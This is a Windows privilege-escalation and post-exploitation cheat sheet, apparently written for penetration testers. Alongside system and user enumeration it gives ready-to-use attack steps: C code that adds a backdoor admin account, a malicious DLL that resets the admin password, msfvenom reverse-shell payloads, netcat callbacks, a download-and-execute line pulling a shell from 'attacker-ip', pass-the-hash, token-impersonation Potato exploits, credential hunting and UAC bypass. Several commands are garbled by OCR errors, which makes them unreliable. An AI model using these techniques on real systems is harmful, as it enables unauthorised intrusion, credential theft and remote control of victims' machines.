# Windows Privilege Escalation+Post Exploitation

Windows Privilege Escalation, Post Exploitation and Lateral Movement Notes.

### Enumeration

#### Listing System details

This is beneficials if you want to find an exploit that matches the version of the windows installed.

```powershell
systeminfo | findstr /B /C: "OS Name"/C: "OS Version"
```

**Export OS info into a file with Powershell**

```powershell
Get-WmiObject -class win32 operatingsjstem | select -property | exportcsv
c:\os.txt
```

**Date and Time**

```powershell
C:\> echo %DATE% %TIME%
```

**Host-Name**

```powershell
C:\> hostname
```

**All systeminfo**

```powershell
C:\> systeminfo
```

**OS Name**

```powershell
C:\> systeminfo I findstr /B /C:"OS Name" /C:"OS Version"
```

**System info with wmic**

```powershell
C:\> wmic csproduct get name
C:\> wmic bios get serialnumber
C:\> wmic computersystem list brief
```

**System info with sysinternals**

```powershell
C:\> psinfo -accepteula -s -h -d

Ref. https://technet.microsoft.com/enus/
sysinternals/psinfo.aspx
```

**View installed softwares**

```powershell
wmic product get name,version,vendor
```

**View installed updates** This information will give you an idea of how quickly systems are being patched and updated.

```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

**Enumerating Drivers and their version**

```
<C:\driverquery /v>
```

We can also use Metasploit to list any missing patches, which you can then reference against vulnerability databases to determine if an exploit exists for the unpatched issue.

```
post/windows/gather/enum_patches
```

#### User Details

**Current user**

```
C:\> whoami
```

**Current groups the logged-in user belongs to**

```
C:\> whoami /groups
```

**Privileges of the logged-in user**

```
C:\> whoami /priv
```

**Retrieve all users and groups**

```
C:\> net user
C:\> net group
C:\> net localgroup
```

**Local settings and domain settings**

```
C:\> net accounts
C:\> net accounts /domain
```

**Retrieve administrators**

```
C:\> net localgroup administrators
```

**Retrieve administrators Groups**

```
C:\> net group administrators
```

**Retrieve user info with wmic**

```
C:\> wmic rdtoggle list
C:\> wmic useraccount list
C:\> wmic group list
C:\> wmic netlogin get name, lastlogon,badpasswordcount
C:\> wmic netclient list brief
```

Using history file

```
C:\> doskey /history> history.txt
```

Get information about other users according to department

```
PS> Get-NetUser -filter "department=HR*"
```

List users

```
net users
```

View specific details about a user

```
net users admin
```

View groups

```
net localgroup
```

View privilege of current user:

```
<C:\whoami /priv>
```

View users of administrator group

```
<C:\net localgroup Administrators>
```

#### Network Enumeration

**With netstat** We use the options `-a` to display all listening ports and active connections. The `-b` lets us find the binary involved in the connection, while `-n` is used to avoid resolving IP addresses and port numbers. Finally, `-o` display the process ID (PID).

Open Connections

```
C:\> netstat ano
```

Listening Ports

```
netstat -an findstr LISTENING
```

Other netstat commands

```
C:\> netstat -e
C:\> netstat -naob
C:\> netstat -nr
C:\> netstat -vb
C:\> nbtstat -s
```

**View routing table**

```
C:\> route print
```

**View ARP table**

```
C:\> arp -a
```

**View DNS settings**

```
C:\> ipconfig /displaydns
```

**Proxy Information**

```
C:\> netsh winhttp show proxy
```

**All IP configs**

```
C:\> ipconfig /allcompartments /all
```

**Network Interfaces**

```
C:\> netsh wlan show interfaces
C:\> netsh wlan show all
```

**With registry**

```
C:\> reg query
"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections\WinHttpSettings"
C:\> type %SYSTEMROOT%\system32\drivers\etc\hosts
```

**With wmic**

```
C:\> wmic nicconfig get
descriptions,IPaddress,MACaddress

C:\> wmic netuse get
name,username,connectiontype, localname
```

**Saved wireless profiles**

```
netsh wlan show profiles
```

**Export wifi plaintext pwd**

```
netsh wlan export profile folder=. key=clear
```

**List interface IDs/MTUs**

```
netsh interface ip show interfaces
```

**Set IP**

```
netsh interface ip set address local static
IP netmask gateway ID
```

**Set DNS server**

```
netsh interface ip set dns local static ip
```

**Set interface to use DHCP**

```
netsh interface ip set address local dhcp
```

#### Services and processes

**View running services**

```
C:\Tasklist /svc
```

**Enumerating the permissions of a service**

```
C:\icacls "C:\Program Files\Serviio\bin\ServiioService.exe" 
```

**Listing the running services**

```
C:\wmic service get name,displayname,pathname,startmode
```

or

```
wmic service list brief
```

or you can view those running only

```
wmic service list brief | findstr  "Running"
```

**View details about a specific service**

```
sc qc [service-name]
```

**Listing services that are auto started**

```
C:\wmic service get name,displayname,pathname,startmode | findstr /i "auto"
```

**Listing non standard windows services with auto start mode**

```
C:\wmic service get name,displayname,pathname,startmode |findstr /i "auto"|findstr /i /v "c:\windows"
```

\#Note: In privilege escalation, we need to look for a service that has unquoted service path. All left is to see if the directory containing the service file is writable or not. **Services running with PowerShell**

```
[1]
PS C:\> Get-Service I Where-Object { $_.Status -eq "running" }

[2]
get-service
```

#### Files and Directories

**Enumerating permissions on a directory**

```
C:> ls | get-acl | fl
```

**Viewing ADS and their owners in a directory**

```
C:> cmd /C dir /Q /R
```

**Viewing ADS of a file**

```
C:> type file.extension:[streamname]
```

You can get the stream name of the file by viewing the whole ADS in the directory. \[icacls needs to be downloaded]> **Searching Based on the extension** \[1]

```
C:\> dir /A /5 /T:A *.exe *.dll *.bat *·PS1 *.zip
```

\[2] Below will do the same as above but specifying a date which will list the files newer than the date used in the command

```

C:\> for %G in (.exe, .dll, .bat, .ps) do forfiles -p "C:" -m *%G -s -d +1/1/2023 -c "cmd /c echo @fdate @ftime @path"
```

**Searching Based on the name**

```
C:\> dir /A /5 /T:A bad.exe
```

**Searching Based on date.** Below will find `.exe` files after `01/01/2023`

```
C:\> forfiles /p C:\ /M *.exe /5 /0 +1/1/2023 /C "cmd /c echo @fdate @ftime @path"
```

**Based on date with Powershell** Below will return files that were modified past 09/21/2023

```
Get-Childitem -Path c:\ -Force -Rec~rse -Filter '.log -ErrorAction
Silentl~Con~inue I where {$ .LastWriteTime -gt ''2012-09-21''}
```

**Searching Based on the size.** Below will find files smaller than 50MB

```
C:\> forfiles /5 /M * /C "cmd /c if @fsize GEO
5097152 echo @path @fsize"
```

**Searching Based on alternate data streams**

```
C:\> streams -s <FILE OR DIRECTORY>
```

[Tool link](https://technet.microsoft.com/enus/sysinternals/streams.aspx) **Display file content**

```
[1]
get-content file

[2]
type file
```

Pipe output to clipboard

```
C:\> some_command.exe I clip
```

Output clip to file

```
PS C:\> Get-Clipboard> clip.txt
```

Combine contents of multiple files

```
C:\> type <FILE NAME 1> <FILE NAME 2> <FILE NAME 3>> <NEW FILE NAME>
```

Compare two files for changes

```
PS C:\> Compare-Object (Get-Content ,<LOG FILE NAMEl>.log) -DifferenceObject (Get-Content.<LOG FILENAME 2>.log)
```

#### Processes and Scheduled Tasks

**Viewing active connections with PID of each process**

```
C:\netstat -ano
```

**View Scheduled Tasks** One of the below commands can be used \[1]

```
schtasks /query /fo LIST /v
```

\[2]

```
schtasks /query /fo LIST 2>nul | findstr TaskName
```

\[3]

```
dir C:\windows\tasks
```

\[4]

```
schtasks /query /fo LIST /v
```

\[5]

```
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

\[6]

```
Get-ScheduledTask
```

#### Network Shares

```
C:\> net use \\<TARGET IP ADDRESS
C:\> net share
C:\> net session
```

**With wmic**

```
C:\> wmic volume list brief

C:\> wmic logicaldisk get
description,filesystem,name,size

C:\> wmic share get name,path
```

#### Installed Programs

Below commands can be used

```
dir /a "C:\Program Files"

dir /a "C:\Program Files (x86)"

reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime

Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Auditing Group Policy Objects

Any of the commands below will list the current GPO settings and the second and third ones will send the output to an external file

```
C:\> gpresult /r
C:\> gpresult /z > <OUTPUT FILE NAME>.txt
C:\> gpresult /H report.html /F
```

With wmic

```
C:\> wmic qfe
```

#### Auditing AutoRuns and Startups

With wmic

```
C:\> wmic startup list full
C:\> wmic ntdomain list brief
```

By viewing the contents startup folder

```
C:\> dir
"%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\P rog rams\Startup"

C:\> dir "%SystemDrive%\Documents and Settings\All

Users\Sta rt Menu\Prog rams\Sta rtup"
C:\> dir %userprofile%\Start Menu\Programs\Startup

C:\> %ProgramFiles%\Startup\

C:\> dir C:\Windows\Start Menu\Programs\startup

C:\> dir "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

C:\> dir "C:\ProgramData\Microsoft\Windows\Start
Menu\Programs\Startup"

C:\> dir "%APPDATA%\Microsoft\Windows\Start
Menu\Programs\Startup"

C:\> dir "%ALLUSERSPROFILE%\Microsoft\Windows\Start
Menu\Programs\Startup"

C:\> dir "%ALLUSERSPROFILE%\Start
Menu\Programs\Startup"
```

Through wininit

```
C:\> type C:\Windows\winstart.bat
C:\> type %windir%\wininit.ini
C:\> type %windir%\win.ini
```

With Sysinternal tools

```
C:\> autorunsc -accepteula -m
C:\> type C:\Autoexec.bat"
```

You can also export the output to a CSV file

```
C:\> autorunsc.exe -accepteula -a -c -i -e -f -l -m -v
```

With regsitry

```
C:\> reg query HKCR\Comfile\Shell\Open\Command

C:\> reg query HKCR\Batfile\Shell\Open\Command

C:\> reg query HKCR\htafile\Shell\Open\Command

C:\> reg query HKCR\Exefile\Shell\Open\Command

C:\> reg query HKCR\Exefiles\Shell\Open\Command

C:\> reg query HKCR\piffile\shell\open\command

C:\> reg query uHKCU\Control Panel\Desktop"

C:\> reg query
HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

C:\> reg query
HKCU\Software\Microsoft\Windows\CurrentVersion\Run

C:\> reg query
HKCU\Software\Microsoft\Windows\CurrentVersion\Runonce

C:\> reg query
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnceEx

C:\> reg query
HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices

C:\> reg query
HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce

C:\> reg query
HKCU\Software\Microsoft\Windows\CurrentVersion\Windows\Run

C:\> reg query
HKCU\Software\Microsoft\Windows\CurrentVersion\Windows\Load

C:\> reg query
HKCU\Software\Microsoft\Windows\CurrentVersion\Windows\Scripts

C:\> reg query «HKCU\Software\Microsoft\Windows
NT\CurrentVersion\Windows« /f run

C:\> reg query «HKCU\Software\Microsoft\Windows
NT\CurrentVersion\Windows« /f load

C:\> reg query
HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

C:\> reg query
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs

C:\> reg query
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedMRU

C:\> reg query
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComD1g32\0pen5aveMRU

C:\> reg query
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU

C:\> reg query
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComD1g32\0pen5avePidlMRU /s

C:\> reg query
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU

C:\> reg query
«HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"

C:\> reg query
uHKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"

C:\> reg query
HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\RegEdit /v LastKey

C:\> reg query "HKCU\Software\Microsoft\InternetExplorer\TypedURLs"

C:\> reg query
uHKCU\Software\Policies\Microsoft\Windows\ControlPanel \Desktop"

C: \> reg query uHKLM\SOFTWARE\Mic rosoft\Act iveSetup\Installed Components" /s

C:\> reg query
"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\explorer\User Shell Folders"

C:\> reg query
"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\explorer\Shell Folders"

C:\> reg query
HKLM\Software\Microsoft\Windows\CurrentVersion\explorer\ShellExecuteHooks

C:\> reg query
"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s

C:\> reg query
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

C:\> reg query
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

C:\> reg query
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Runonce

C:\> reg query
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx

C:\> reg query
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices
C:\> reg query

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce

C:\> reg query
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon\Userinit

C:\> reg query
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\shellServiceObjectDelayLoad

C:\> reg query "HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Schedule\TaskCache\Tasks" /s

C:\> reg query "HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Windows"

C:\> reg query "HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Windows" /f Appinit_DLLs

C:\> reg query "HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Winlogon" /f Shell

C: \> reg query "HKLM\SOFTWARE\Mic rosoft\WindowsNT\CurrentVersion\Winlogon" /f Userinit

C:\> reg query
HKLM\SOFTWARE\Policies\Microsoft\Windows\Systern\Scripts
C:\> reg query

HKLM\SOFTWARE\Classes\batfile\shell\open\cornrnand

C:\> reg query
HKLM\SOFTWARE\Classes\cornfile\shell\open\cornrnand

C:\> reg query
HKLM\SOFTWARE\Classes\exefile\shell\open\command

C:\> reg query
HKLM\SOFTWARE\Classes\htafile\Shell\Open\Command

C:\> reg query
HKLM\SOFTWARE\Classes\piffile\shell\open\command

C:\> reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s

C:\> reg query
"HKLM\SYSTEM\CurrentControlSet\Control\Session
Manager"

C:\> reg query
"HKLM\SYSTEM\CurrentControlSet\Control\Session
Manager\KnownDLLs"

C:\> reg query
"HKLM\SYSTEM\ControlSet001\Control\Session
Manager\KnownDLLs"
```

#### Netview Tool

**Hosts in current domain**

```
net view /domain
```

**Hosts in example.com**

```
net view /domain:example.com
```

**All users in current domain**

```
net user /domain
```

**Add user**

```
net user user pass /add
```

**Add user to Administrators**

```
net localgroup "Administrators" user /add
```

**Show Domain password policy**

```
net accounts /domain
```

**List local Admins**

```
net localgroup "Administrators"
```

**List domain groups**

```
net group /domain
```

**List users in Domain Admins**

```
net group "Domain Adrnins" /domain
```

**List domain controllers for current domain**

```
net group "Domain Controllers 11 /domain
```

**Current SMB shares**

```
net share
```

**Active SMB sessions**

```
net session I find I "\\"
```

**Unlock domain user account**

```
net user user /ACTIVE:jes /domain
```

**Change domain user password**

```
net user user '' newpassword '' /domain
```

**Share folder**

```
net share share c:\share /GRANT:Everyone,FULL
```

### Remote Logging in

Remote logging works when you have successfully extracted working credentials/accounts in the target machine. You can then use them to login to the target machine and have a stable shell. The below tools can be used to accomplish this purpose. You can Install/download these tools from Impacket. **psexec**

```
psexec.py <user>@<ip> powershell
```

**wmiexec**

```
wmiexec.py <user>@<ip>
```

**smbexec**

```
smbexec.py <user>@<ip>
```

### Manual Privilege Escalation Methods

#### Unquoted Service Path

**Manual**

**Checking if a directory is writable.**

```
<C:\icacls "C:\(name)">
```

\#If its writable, then we create a reverse shell that evades Anti virus detection and place it in that directory. #We can then change the configuration of the service to run our payload instead.

```
<C:\Sc config (service-name) binpath=(path-to-your-payload)>
```

\#Start a new listener on your machine #Place your payload in the same directory as the service’s one.

```
<C:\Sc start (servicename)>
```

**finding the owner and info about a service**

```
<C:\sc.exe qc [service-name]>
```

**Checking the access rights of a service**

```
<C:\Accesschk.exe /accepteula /ucqv [service-name]>
```

**Changing the bin path of a service to point to your malicious payload**

```
<C:\Sc.exe config [service-name] binpath=’cmd /c [path to your payload on the remote host]’>
```

If SeLoadDriverPrivilege is enabled as a privilege for the current user then use capcom exploit

```
<C:.\EOPLOADDRIVER.exe System\CurrentControlSet\MyService .\capcom.sys
```

Then using a bat file containing a call to a netcat listener

```
C:\Windows\Temp\nc.exe 10.10.15.74 55541 -e cmd.exe
```

Save the above into exploit.bat

```
<C:.\ExploitCapcom_modded.exe
```

**With Metasploit**

The below module can be used

```
use exploit/windows/local/service_permissions
```

You have then to set the SESSION ID and run `exploit`

#### Adding a new admin user to the compromised windows system.

Method \[1] Replace this code with an executable file with weak permissions and is run as a service or as an admin.

```
#include <stdlib.h>
int main ()
{
int i;
i = system ("net user evil Ev!lpass /add");
i = system ("net localgroup administrators evil /add");
return 0;
}
```

Method\[2] From the command promopt

```
net user /add [username] [password]
net localgroup administrators [username] /add
```

#### Finding Files that Store Passwords in Plain Text

Many third-party software packages store credentials that you may be able to retrieve. Examples include VNC tools like UltraVNC and RealVNC, both of which store passwords on the local system. PuTTY, the popular SSH client, stores proxy credentials in cleartext in the Windows Registry under \`HKCU/Software/SimonTatham/Putty/Sessions **Common File locations**

```
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system``32``\sysprep.inf
C:\Windows\system``32``\sysprep\sysprep.xml
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

**With Find command**

```
<C:\findstr /si password *.xml *.ini *.txt *.config *.bat>
```

**Viewing file content with powershell**

```
<PS C:\Get-Content "c:\windows\panther\unattend.xml" | Select-String "Password" -Context 2>
```

**With Metasploit**

```
post/windows/gather/enum_unattend
```

**With Registry**

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```

**With Powersploit**

```
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-SiteListPassword
Get-CachedGPPPassword
Get-RegistryAutoLogon
```

/si: means searching in current directory

#### Adding a new admin user to the compromised windows system.

Replace this code with an executable file with weak permissions and is run as a service or as an admin.

```
#include <stdlib.h>
int main ()
{
int i;
i = system ("net user evil Ev!lpass /add");
i = system ("net localgroup administrators evil /add");
return 0;
}
```

#### Pass The Hash

This technique works if you managed to retrieve the NTLM hash of one of the users. From your attacking machine, issue the below command

```
pth-winexe -U user%NTLM-hash --system //target-ip cmd.exe
```

#### DLL Hijacking

DLL hijacking relies on two conditions 1- An application that is trying to access a non-existent DLL 2- a write access to the location of that missing DLL After you know the name of the DLL that is missing, you can create a malicious DLL.

**Creating malicious DLL with msfvenom**

```
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=your-ip LPORT=your-port -f dll > malicious.dll
```

After you have generated the DLL, place it in the location where the application is trying to access.

**Manually using a C code**

```
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {

	if (dwReason == DLL_PROCESS_ATTACH) {
		system("cmd.exe /k net user admin newpass");
		ExitProcess(0);
	}
	return TRUE;
}
```

The above code changes the admin password to \[newpass] Compile the code with the below command on linux

```
x86_64-w64-mingw32-gcc code.c -shared -o code.dll
```

Replace \[code.dll] with the targeted or missing dll on the target machine then stop and start its associated service to execute your dll.

#### DLL Injection

**With PowerSploit**

First generate malicious DLL with Msfvenom

```
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=your-ip LPORT=your-port -f dll > malicious.dll
```

Next we need to PID of the process which will be our target. You can obtain the PID from the task manager or by listing the running processes. Then we invoke the DLL injection module

```
Invoke-DLLInjection -ProcessID PID -Dll C:\path-to-malicous-DLL
```

Note: `make sure you setup your listener in metasploit multi handler module with same settings you used when creating the DLL with msfvenom`

#### Finding Weak File Permissions

**Using accesschk**

Link

```
https://technet.microsoft.com/en-us/sysinternals/accesschk.aspx
```

After you have uploaded it to the target machine you can execute the below command

```
accesschk.exe -uwqcv "user" * -accepteula
```

Based on the output, you can decide what privilege escalation methods to use from this document. Common privilege escalation methods that exploit weak file permissions are

```
unquoted service path
DLL Hijacking
```

**Using Icacls**

We can find files and directories with full control assigned to every one

```
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"

icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"

icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"

icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
```

**Powershell**

```
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

#### Autologon

Sometimes the machine stores default credentials in plain text in the registry. We can query them with the below command

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

These credentials can then be used in different methods:

**Method one: Powershell run as**

If you have got authentication credentials for a machine and you want to execute commands remotely, then execute the below powershell. Make sure to substitute \[open-port]

```
PS > $pass = convertto-securestring -AsPlainText -Force -String 'pass'; 

PS > $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist 'domainname\username',$pass; 

PS > Invoke-Command -ComputerName computer-name -Credential $cred -Port 5985 -ScriptBlock { command }
```

The next example will execute use the credentials obtained and retrieve a shell from the attacker machine `shell.ps` that could be `nishasng shell` and you should receive the shell back from the vicitim machine to your listener.

```
PS C:\inetpub\wwwroot\internal-01\log> $username = "pentesting.local\Administrator" 

PS C:\inetpub\wwwroot\internal-01\log> $password = "3130457h31186feef962f597711faddb"

PS C:\inetpub\wwwroot\internal-01\log> $securestring = New-Object -TypeName System.Security.SecureString 

PS C:\inetpub\wwwroot\internal-01\log> $password.ToCharArray() | ForEach-Object {$securestring.AppendChar($_)} 

PS C:\inetpub\wwwroot\internal-01\log> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $securestring 

PS C:\inetpub\wwwroot\internal-01\log> Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://attacker-ip:8080/shell.ps1') } -Credential $cred -Computer localhost
```

**Method Two: Using net use**

This method gets us access only to the file system

```
net use x: \\localhost\c$ /user:administrator [insert password]
```

#### Always Install Elevated

This issue can exist on a system that allows users to execute installer packages with system privileges without providing credentials

Determine if it's activated on the target system. If the output of the below commands is `0x1` it means that it's activated.

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Exploit with Metasploit**

```
use exploit/windows/local/always_install_elevated
```

Set the LHOST, SESSION and run.

**Exploit with Powersploit**

Import the module

```
Import-Module Privesc
```

Enumerate the issue

```
Get-RegistryAlwaysInstallElevated
```

Generate the malicious MSI

```
Write-UserAddMSI
```

Then run the yielded MSI which will prompt you to create and add the user into the administrators group

#### Rotten Potato

Rotten potato is based on tricking the `NT Authority\System` into authenticating and negotiating via the NTLM locally which can create the possibility of token impersonation/manipulation.

If you have compromised a service account and got a meterpreter shell then download rotten potato from below link

```
https://github.com/breenmachine/RottenPotatoNG
```

**With Metasploit**

From Meterpreter execute the below

```
execute -f rottenpotato.exe -Hc
```

Or

```
load incognito
```

Then list the tokens

```
list_tokens -u
```

You should get `NT Authority\System` token available to impersonate. Execute the below

```
impersonate_token "NT Authority\\System"
```

**With Powersploit**

Invoke the module

```
Invoke-TokenManipulation -Enumerate
```

Depending on the output, look for the username that is administrator and execute the below

```
Invoke-TokenManipulation -ImpersonateUser -Username "pentest\Administrator"
```

And

```
Invoke-TokenManipulation -ImpersonateUser -Username "NT Authority\System"
```

#### Exploiting saved credentials

Windows also allows users to save their credentials to the system when they run programs using `runas` With Winpeas

```
cmdkey /list

.\winPEASany.exe quiet cmd windowscreds
```

Then the saved creds can be used to run commands as any user

```
runas /savecred /user:admin C:\shell.exe

runas /savecred /user:WORKGROUP\Administrator "\\ip\SHARE\evil.exe"

runas /savecred /user:Administrator "cmd.exe /k whoami"
```

#### Secondary Logon Handler

**With Metasploit**

```
exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```

**With Powershell and ExploitDB**

Link to download

```
https://www.exploit-db.com/exploits/39719
```

Once downloaded onto the target system, execute the below

```
powershell -exe bypass
Import-Module .\script-name.ps1
Invoke-MS16-032
```

After successful execution, this will bring up an elevated command prompt by which you can execute commands as an admin.

#### Exploiting SeImpersonatePrivilege

**JuicyPotato**

Link to download

```
https://github.com/ohpe/juicy-potato
```

Vulnerable Windows versions

```
Windows 7 Enterprise
Windows 8.1 Enterprise
Windows 10 Enterprise
Windows 10 Professional
Windows Server 2008 R2 Enterprise
Windows Server 2012 Datacenter
Windows Server 2016 Standard
```

We then create the payload \[1] Option

```
msfvenom -p cmd/windows/reverse_powershell lhost=your-ip lport=4545 > shell.bat
```

\[2] Option

```
msfvenom -p windows/shell_reverse_tcp LHOST=your-ip LPORT=4545 -f exe > shell.exe
```

Then transfer your payload and juicypotato.exe to the target machine. Execute the below

```
./jp.exe -t * -p shell.bat -l 4545

-t: Create process call. For this option we’ll use * to test both options.

-p: The program to run. We’ll need to create a file that sends a reverse shell back to our attack machine.

-l: COM server listen port. This can be anything. We’ll use 4545.
```

If the above command fails then you need to provide the CLSID. **CLSID List -**

* [Windows 7 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows\_7\_Enterprise)
* [Windows 8.1 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows\_8.1\_Enterprise)
* [Windows 10 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows\_10\_Enterprise)
* [Windows 10 Professional](https://ohpe.it/juicy-potato/CLSID/Windows\_10\_Pro)
* [Windows Server 2008 R2 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows\_Server\_2008\_R2\_Enterprise)
* [Windows Server 2012 Datacenter](https://ohpe.it/juicy-potato/CLSID/Windows\_Server\_2012\_Datacenter)
* [Windows Server 2016 Standard](https://ohpe.it/juicy-potato/CLSID/Windows\_Server\_2016\_Standard)

Then execute

```
./jp.exe -t * -p shell.bat -l 4545 -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

**Rogue Potato**

Link to download

```
https://github.com/antonioCoco/RoguePotato
```

Usage

**Network redirector / port forwarder to run on your remote machine, must use port 135 as src port**

```
socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999
```

**RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. Use this if you have fw restrictions.**

```
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"
```

**RoguePotato all in one with RogueOxidResolver running locally on port 9999**

```
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999
```

**RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename**

```
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode
```

**Print Spoofer**

PrintSpoofer exploit that can be used to escalate service user permissions on Windows Server 2016, Server 2019, and Windows 10. **Exploit URL**

```
https://github.com/dievus/printspoofer
```

\[1] Execute the below command to spawn an elevated shell with the same session

```
PrintSpoofer.exe -i -c cmd
```

\[2] Execute the below to spawn a netcat connection back to your machine

```
PrintSpoofer.exe -c "c:\inetpub\wwwroot\nt4wrksv\nc.exe 10.x.x.x 443 -e cmd"
```

Pay attention to the path of `nc.exe` and change it if you uploaded the nc binary into a different location.

**EfsPotato**

Link below

```
https://github.com/zcgonvh/EfsPotato
```

First we transfer the file EfsPotato.cs to the target machine using curl or cewl or powershell or wget.

#### Bypassing UAC

**UAC Definition** This feature allows for any process to be run with low privileges independent of who runs it (either a regular user or an admin). User Account Control (UAC) is a Windows security feature that forces any new process to run in the security context of a non-privileged account by default. This policy applies to processes started by any user, including administrators themselves. The idea is that we can't solely rely on the user's identity to determine if some actions should be authorized. **Logic Behind UAC** Imagine the case where user BOB unknowingly downloads a malicious application from the Internet. If BOB is a part of the Administrators group, any application he launches will inherit its access token privileges. So if BOB decides to launch the malicious application and UAC is disabled, the malicious application would gain administrator privileges instantly. Instead, the malicious application will be restricted to a non-administrative access token when UAC is enabled. **UAC Settings** Depending on our security requirements, UAC can be configured to run at four different notification levels:

* _**Always notify:**_ Notify and prompt the user for authorization when making changes to Windows settings or when a program tries to install applications or make changes to the computer.
* _**Notify me only when programs try to make changes to my computer:**_ Notify and prompt the user for authorization when a program tries to install applications or make changes to the computer. Administrators won't be prompted when changing Windows settings.
* _**Notify me only when programs try to make changes to my computer (do not dim my desktop):**_ Same as above, but won't run the UAC prompt on a secure desktop.
* _**Never notify:**_ Disable UAC prompt. Administrators will run everything using a high privilege token. **Practical UAC Bypass Methods** Most of the bypass techniques rely on us being able to leverage a High IL process to execute something on our behalf. Since any process created by a High IL parent process will inherit the same integrity level, this will be enough to get an elevated token without requiring us to go through the UAC prompt. _**AutoEleveate**_ Some executables can auto-elevate, achieving high IL without any user intervention. This applies to most of the Control Panel's functionality and some executables provided with Windows. For an application, some requirements need to be met to auto-elevate:
* The executable must be signed by the Windows Publisher.
* The executable must be contained in a trusted directory, like `%SystemRoot%/System32/` or `%ProgramFiles%/` Some examples of applications that auto-elevate in Windows include

```
mmc.exe
pkgmgr.exe 
spinstall.exe
msconfig.exe
Fodhelper.exe
```

